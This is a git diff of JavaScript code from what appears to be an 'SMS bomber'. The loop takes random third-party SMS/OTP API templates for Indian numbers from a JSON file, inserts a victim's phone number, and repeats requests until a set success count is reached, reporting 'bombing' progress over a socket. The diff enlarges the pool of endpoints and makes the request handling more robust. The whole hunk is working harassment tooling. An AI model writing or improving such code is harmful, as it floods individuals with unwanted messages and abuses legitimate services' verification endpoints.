@@ -47,33 +47,40 @@ fs.readFile('apidata.json',async (err,data) =>{
     if(err) throw err;
 
     while(success<count){
-        var nom = Math.floor((Math.random() * 10) + 1);
-                var json = JSON.stringify(JSON.parse(data).sms[91][nom]).replace(/{target}/g,number).replace(/{cc}/g,"91");
-       json = JSON.parse(json);
+        var nom = Math.floor((Math.random() * 24) + 1);
+        var jj = JSON.stringify(JSON.parse(data).sms[91][nom]);
+        if(jj){
+            var json = jj.replace(/{target}/g,number).replace(/{cc}/g,"91");
+        json = JSON.parse(json);
     
         var newdata = {
             url:json.url,
             method:json.method,
             data:json.data,
+            params:json.params,
+            json:json.json,
             headers:json.headers,
             timeout:6000
         }
         var identifier = json.identifier;
         try {
            var request = await axios(newdata);
+           var resp = JSON.stringify(request.data)
+           verified = resp.includes(identifier)
+           if(verified){
+                success++
+                var jsonf = {
+                  "success":success
+                }
+                socket.emit('bombing',jsonf);
+                console.log(json.name)
+            } else{
+            failed++;
+            } 
         } catch(err){
         }
-        var resp = JSON.stringify(request.data)
-        verified = resp.includes(identifier)
-        if(verified){
-            success++
-            var json = {
-                "success":success
-            }
-            socket.emit('bombing',json);
-        } else{
-            failed++;
-        } 
+        
+        }
    }
 })
 }
